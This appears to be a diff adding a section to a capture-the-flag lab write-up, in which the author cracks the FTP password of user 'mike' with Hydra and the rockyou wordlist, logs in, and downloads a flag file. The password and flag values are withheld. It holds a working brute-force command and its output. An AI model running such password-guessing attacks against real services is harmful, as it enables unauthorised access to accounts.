@@ -454,3 +454,84 @@ Both FTP and Telnet send their commands, channels, and communications unencrypte
 As a result, an attacker in a man-in-the-middle position on the network path could see everything passing over those connections, including commands and transferred data.
 
 This is a general security property of these protocols, not a man-in-the-middle attack performed in this lab.
+
+## 10. Cracking Mike's FTP Password with Hydra and Retrieving ftp.txt
+
+The name Mike from `PUBLIC_NOTICE.txt` gave a username to try against the FTP service.
+
+### Password Cracking with Hydra
+
+I ran Hydra online against the FTP service, using the username `mike` and the rockyou wordlist:
+
+```bash
+hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <IP_ADDRESS> ftp
+```
+
+```text
+Hydra v9.6 starting at 2026-10-28 19:54:01
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ftp://<IP_ADDRESS>:21/
+[STATUS] attack finished for <IP_ADDRESS> (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at 2026-10-28 19:54:16
+```
+
+Hydra found a valid password very quickly, within about 15 seconds. The password value itself is intentionally omitted from this write-up, following the rule not to record passwords.
+
+This worked because the account used a weak password that appeared early in the wordlist, so online guessing succeeded without needing a long brute-force run.
+
+### Logging in as Mike
+
+Using the cracked password, I logged in to FTP as `mike`:
+
+```bash
+ftp <IP_ADDRESS>
+```
+
+```text
+Connected to <IP_ADDRESS>.
+220 Welcome to the administrator FTP service.
+Name: mike
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+```
+
+### Listing and Downloading ftp.txt
+
+Listing Mike's FTP directory returned:
+
+```text
+ftp> ls
+229 Entering Extended Passive Mode (|||29948|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
+-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
+226 Directory send OK.
+```
+
+Trying `cat` inside the FTP client failed, because `cat` is not an FTP command:
+
+```text
+ftp> cat ftp.txt
+?Invalid command.
+```
+
+So I downloaded the file first, then read it locally:
+
+```text
+ftp> get ftp.txt
+local: ftp.txt remote: ftp.txt
+229 Entering Extended Passive Mode (|||27110|)
+150 Opening BINARY mode data connection for ftp.txt (26 bytes).
+226 Transfer complete.
+26 bytes received in 00:00 (0.21 KiB/s)
+```
+
+```bash
+cat ftp.txt
+```
+
+That file contained the FTP flag. The flag value is intentionally omitted from this write-up.
